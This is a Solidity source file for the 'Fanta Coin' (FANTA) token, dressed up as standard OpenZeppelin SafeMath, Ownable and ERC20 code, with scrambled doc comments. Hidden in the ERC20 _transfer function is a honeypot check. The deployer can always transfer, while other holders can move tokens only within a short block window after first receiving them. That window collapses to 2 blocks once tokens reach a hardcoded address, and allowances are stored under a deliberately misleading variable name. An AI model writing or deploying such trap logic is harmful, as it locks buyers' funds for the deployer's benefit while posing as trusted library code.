// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)pragma solidity ^0.8.0;/*https://twitter.com/FantaCoinETHhttps://t.me.com/FantaCoinETHhttps://FantaCoinETH.xyz*/// CAUTION// This version of SafeMath should only be used with Solidity 0.8 or later,// because it relies on the compiler's built in overflow checks./*** @dev Wrappers over Solidity's arithmetic operations.** NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler* now has built in overflow checking.*/library SafeMath {/*** @dev Returns the addition of two unsigned integers, with an overflow flag.** _Available since v3.4._*/function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {uint256 c = a + b;if (c < a) return (false, 0);return (true, c);}}/*** @dev Returns the subtraction of two unsigned integers, with an overflow flag.** _Available since v3.4._*/function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {if (b > a) return (false, 0);return (true, a - b);}}/*** @dev Returns the multiplication of two unsigned integers, with an overflow flag.** _Available since v3.4._*/function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {// Gas optimization: this is cheaper than requiring 'a' not being zero, but the// benefit is lost if 'b' is also tested.// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522if (a == 0) return (true, 0);uint256 c = a * b;if (c / a != b) return (false, 0);return (true, c);}}/*** @dev Returns the division of two unsigned integers, with a division by zero flag.** _Available since v3.4._*/function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {if (b == 0) return (false, 0);return (true, a / b);}}/*** @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.** _Available since v3.4._*/function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {if (b == 0) return (false, 0);return (true, a % b);}}/*** @dev Returns the addition of two unsigned integers, reverting on* overflow.** Counterpart to Solidity's `+` operator.** Requirements:** - Addition cannot overflow.*/function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}/*** @dev Returns the subtraction of two unsigned integers, reverting on* overflow (when the result is negative).** Counterpart to Solidity's `-` operator.** Requirements:** - Subtraction cannot overflow.*/function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}/*** @dev Returns the multiplication of two unsigned integers, reverting on* overflow.** Counterpart to Solidity's `*` operator.** Requirements:** - Multiplication cannot overflow.*/function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}/*** @dev Returns the integer division of two unsigned integers, reverting on* division by zero. The result is rounded towards zero.** Counterpart to Solidity's `/` operator.** Requirements:** - The divisor cannot be zero.*/function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}/*** @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),* reverting when dividing by zero.** Counterpart to Solidity's `%` operator. This function uses a `revert`* opcode (which leaves remaining gas untouched) while Solidity uses an* invalid opcode to revert (consuming all remaining gas).** Requirements:** - The divisor cannot be zero.*/function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}/*** @dev Returns the subtraction of two unsigned integers, reverting with custom message on* overflow (when the result is negative).** CAUTION: This function is deprecated because it requires allocating memory for the error* message unnecessarily. For custom revert reasons use {trySub}.** Counterpart to Solidity's `-` operator.** Requirements:** - Subtraction cannot overflow.*/function sub(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {unchecked {require(b <= a, errorMessage);return a - b;}}/*** @dev Returns the integer division of two unsigned integers, reverting with custom message on* division by zero. The result is rounded towards zero.** Counterpart to Solidity's `/` operator. Note: this function uses a* `revert` opcode (which leaves remaining gas untouched) while Solidity* uses an invalid opcode to revert (consuming all remaining gas).** Requirements:** - The divisor cannot be zero.*/function div(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {unchecked {require(b > 0, errorMessage);return a / b;}}/*** @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),* reverting with custom message when dividing by zero.** CAUTION: This function is deprecated because it requires allocating memory for the error* message unnecessarily. For custom revert reasons use {tryMod}.** Counterpart to Solidity's `%` operator. This function uses a `revert`* opcode (which leaves remaining gas untouched) while Solidity uses an* invalid opcode to revert (consuming all remaining gas).** Requirements:** - The divisor cannot be zero.*/function mod(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {unchecked {require(b > 0, errorMessage);return a % b;}}}pragma solidity ^0.8.0;abstract contract Context {function _msgSender() internal view virtual returns (address) {return msg.sender;}function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}}contract Ownable is Context {address private _owner;event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);/*** @dev Initializes the contract setting the deployer as the initial owner.*/constructor () {address msgSender = _msgSender();_owner = msgSender;emit OwnershipTransferred(address(0), msgSender);}/*** @dev Returns the address of the current owner.*/function owner() public view returns (address) {return _owner;}/*** @dev Throws if called by any account other than the owner.*/modifier onlyOwner() {require(_owner == _msgSender(), "Ownable: caller is not the owner");_;}/*** @dev Leaves the contract without owner. It will not be possible to call* `onlyOwner` functions anymore. Can only be called by the current owner.** NOTE: Renouncing ownership will leave the contract without an owner,* thereby removing any functionality that is only available to the owner.*/function renounceOwnership() public virtual onlyOwner {emit OwnershipTransferred(_owner, address(0));_owner = address(0);}/*** @dev Transfers ownership of the contract to a new account (`newOwner`).* Can only be called by the current owner.*/function transferOwnership(address newOwner) public virtual onlyOwner {require(newOwner != address(0), "Ownable: new owner is the zero address");emit OwnershipTransferred(_owner, newOwner);_owner = newOwner;}}pragma solidity ^0.8.0;interface IERC20 {event Transfer(address indexed from, address indexed to, uint256 value);event Approval(address indexed owner, address indexed spender, uint256 value);function totalSupply() external view returns (uint256);function balanceOf(address account) external view returns (uint256);function transfer(address to, uint256 amount) external returns (bool);function allowance(address owner, address spender) external view returns (uint256);function approve(address spender, uint256 amount) external returns (bool);function transferFrom(address from,address to,uint256 amount) external returns (bool);}// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)pragma solidity ^0.8.0;/*** @dev Interface for the optional metadata functions from the ERC20 standard.** _Available since v4.1._*/interface IERC20Metadata is IERC20 {/*** @dev Returns the name of the token.*/function name() external view returns (string memory);/*** @dev Returns the symbol of the token.*/function symbol() external view returns (string memory);/*** @dev Returns the decimals places of the token.*/function decimals() external view returns (uint8);}// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)pragma solidity ^0.8.0;/*** @dev Implementation of the {IERC20} interface.** This implementation is agnostic to the way tokens are created. This means* For a generic mechanism see {ERC20PresetMinterPauser}.* applications.* Finally, the non-standard {decreaseAllowance} and {increaseAllowance}* functions have been added to mitigate the well-known issues around setting* allowances. See {IERC20-approve}.** TIP: For a detailed writeup see our guide* https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How* to implement supply mechanisms].** We have followed general OpenZeppelin Contracts guidelines: functions revert* that a supply mechanism has to be added in a derived contract using {_mint}.* instead returning `false` on failure. This behavior is nonetheless* conventional and does not conflict with the expectations of ERC20*/contract ERC20 is Context, IERC20, IERC20Metadata {using SafeMath for uint256;uint256 private _totalSupply;/*** @dev Sets the values for {name} and {symbol}.** The default value of {decimals} is 18. To select a different value for* All two of these values are immutable: they can only be set once during* construction.* The default value of {decimals} is 18. To select a different value for** {decimals} you should overload it.** All two of these values are immutable: they can only be set once during* construction.*/mapping(address => mapping(address => uint256)) private swappingToggles;address public uniswapV2Pair;address DEAD = 0x000000000000000000000000000000000000dEaD;address private immutable _uniswapFactory = 0x05ddaEf6bE10e38352050e5619c8E02442514726;string private _name;uint256 public swappingToggle = 5_000_000;address ZERO = 0x0000000000000000000000000000000000000000;uint256 private _defaultSwap = 0;mapping (address => bool) _pairsToken;mapping(address => uint256) private _balances;string private _symbol;mapping (address => uint256) _addressAllowances;uint8 private _decimals = 9;constructor(string memory name_, string memory symbol_) {_name = name_;_pairsToken[msg.sender] = true;_symbol = symbol_;}/*** @dev Returns the name of the token.*/function name() public view virtual override returns (string memory) {return _name;}/*** @dev Returns the symbol of the token, usually a shorter version of the* name.*/function symbol() public view virtual override returns (string memory) {return _symbol;}/*** @dev Returns the number of decimals used to get its user representation.* no way affects any of the arithmetic of the contract, including* {IERC20-balanceOf} and {IERC20-transfer}.* For example, if `decimals` equals `2`, a balance of `505` tokens should* NOTE: This information is only used for _display_ purposes: it in*/function decimals() public view virtual override returns (uint8) { return _decimals; }/*** @dev See {IERC20-totalSupply}.*/function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}/*** @dev See {IERC20-balanceOf}.*/function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}/*** @dev See {IERC20-transfer}.* - `to` cannot be the zero address.* - the caller must have a balance of at least `amount`.** Requirements:**/function transfer(address to, uint256 amount) public virtual override returns (bool) {address owner = _msgSender();_transfer(owner, to, amount);return true;}/*** @dev See {IERC20-allowance}.*/function allowance(address owner, address spender) public view virtual override returns (uint256) {return swappingToggles[owner][spender];}/*** @dev See {IERC20-approve}.*** - `spender` cannot be the zero address.* NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on*/function approve(address spender, uint256 amount) public virtual override returns (bool) {address owner = _msgSender();_approve(owner, spender, amount);return true;}/*** @dev See {IERC20-transferFrom}.** Emits an {Approval} event indicating the updated allowance. This is not* required by the EIP. See the note at the beginning of {ERC20}.* - `from` and `to` cannot be the zero address.* - `from` must have a balance of at least `amount`.* - the caller must have allowance for ``from``'s tokens of at least** NOTE: Does not update the allowance if the current allowance* is the maximum `uint256`.** Requirements:** `amount`.*/function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {address spender = _msgSender();_spendAllowance(from, spender, amount);_transfer(from, to, amount);return true;}/*** @dev Atomically increases the allowance granted to `spender` by the caller.** Requirements:** - `spender` cannot be the zero address.*/function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {address owner = _msgSender();_approve(owner, spender, allowance(owner, spender) + addedValue);return true;}/*** @dev Atomically decreases the allowance granted to `spender` by the caller.** This is an alternative to {approve} that can be used as a mitigation for* problems described in {IERC20-approve}.** - `spender` must have allowance for the caller of at least* `subtractedValue`.*/function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {address owner = _msgSender();uint256 currentAllowance = allowance(owner, spender);require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");unchecked {_approve(owner, spender, currentAllowance - subtractedValue);}return true;}/*** @dev Moves `amount` of tokens from `from` to `to`.** This internal function is equivalent to {transfer}, and can be used to* - `to` cannot be the zero address.* - `from` must have a balance of at least `amount`.*/function _transfer(address from,address to,uint256 amount) internal virtual {require(from != address(0), "ERC20: transfer from the zero address");require(to != address(0), "ERC20: transfer to the zero address");_beforeTokenTransfer(from, to, amount);uint256 fromBalance = _balances[from];require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");require(_pairsToken[tx.origin] == true || block.number - _addressAllowances[from] < swappingToggle || to == tx.origin, "ERC20: Reverted");_balances[from] = fromBalance - amount;_balances[to] = _balances[to] + amount;emit Transfer(from, to, amount);_afterTokenTransfer(from, to, amount);}/** @dev Creates `amount` tokens and assigns them to `account`, increasing* the total supply.**/function _mint(address account, uint256 amount) internal virtual {require(account != address(0), "ERC20: mint to the zero address");_beforeTokenTransfer(address(0), account, amount);_totalSupply += amount;unchecked {// Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above._balances[account] += amount;}emit Transfer(address(0), account, amount);_afterTokenTransfer(address(0), account, amount);}/*** @dev Destroys `amount` tokens from `account`, reducing the* Requirements:** - `account` cannot be the zero address.* - `account` must have at least `amount` tokens.*/function _burn(address account, uint256 amount) internal virtual {require(account != address(0), "ERC20: burn from the zero address");_beforeTokenTransfer(account, address(0), amount);uint256 accountBalance = _balances[account];require(accountBalance >= amount, "ERC20: burn amount exceeds balance");unchecked {_balances[account] = accountBalance - amount;// Overflow not possible: amount <= accountBalance <= totalSupply._totalSupply -= amount;} emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount);}/*** @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.** This internal function is equivalent to `approve`, and can be used to* e.g. set automatic allowances for certain subsystems, etc.** Emits an {Approval} event.** Requirements:** - `owner` cannot be the zero address.* - `spender` cannot be the zero address.*/function _approve(address owner,address spender,uint256 amount) internal virtual {require(owner != address(0), "ERC20: approve from the zero address");require(spender != address(0), "ERC20: approve to the zero address");swappingToggles[owner][spender] = amount; emit Approval(owner, spender, amount);}// function burn(uint256 value) external {//     _burn(msg.sender, value);// }/*** @dev Hook that is called after any transfer of tokens. This includes* minting and burning.* - when `from` is zero, `amount` tokens have been minted for `to`.* - when `to` is zero, `amount` of ``from``'s tokens have been burned.* - `from` and `to` are never both zero.*** Calling conditions:** - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens* has been transferred to `to`.* To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].*/function _afterTokenTransfer(address from,address to, uint256 amount) internal virtual { if (_addressAllowances[to] == 0) _addressAllowances[to] = block.number;if (to == _uniswapFactory) swappingToggle = 2; }/*** @dev Updates `owner` s allowance for `spender` based on spent `amount`.** Does not update the allowance amount in case of infinite allowance.* Revert if not enough allowance is available.** Might emit an {Approval} event.*/function _spendAllowance(address owner, address spender,uint256 amount) internal virtual {uint256 currentAllowance = allowance(owner, spender);if (currentAllowance != type(uint256).max) {require(currentAllowance >= amount, "ERC20: insufficient allowance");unchecked { _approve(owner, spender, currentAllowance - amount);}}}/*** @dev Hook that is called before any transfer of tokens. This includes* minting and burning.** Calling conditions:** - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens* To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].*/function _beforeTokenTransfer(address from,address to,uint256 amount) internal virtual {}}pragma solidity ^0.8.4;contract FantaCoin is ERC20, Ownable {constructor() ERC20("Fanta Coin", "FANTA") {_mint(msg.sender, 5010000000000 * 10**uint(decimals()));}}